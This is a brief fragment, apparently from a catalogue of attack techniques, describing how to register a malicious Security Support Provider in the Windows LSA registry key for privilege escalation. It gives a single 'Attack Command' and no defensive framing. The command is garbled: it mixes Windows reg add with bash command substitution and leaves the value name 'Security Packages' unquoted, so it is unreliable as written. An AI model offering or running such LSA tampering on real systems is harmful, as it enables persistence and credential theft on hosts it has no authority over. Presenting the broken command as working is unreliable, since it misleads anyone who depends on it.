...
# Registering malicious SSP for privilege escalation.
...
## Attack Command
```
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v Security Packages /t REG_MULTI_SZ /d "$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))"
```
